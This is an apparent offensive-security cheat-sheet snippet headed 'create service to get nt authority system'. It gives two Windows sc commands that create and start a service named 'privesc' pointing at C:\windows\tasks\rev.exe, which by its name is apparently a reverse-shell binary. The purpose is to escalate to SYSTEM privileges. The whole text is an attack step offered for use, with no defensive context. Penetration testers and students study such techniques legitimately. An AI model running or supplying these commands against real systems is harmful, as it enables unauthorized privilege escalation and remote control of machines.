# create service to get nt authority system

```powershell
sc create privesc binPath= "C:\windows\tasks\rev.exe"
sc start privesc
```
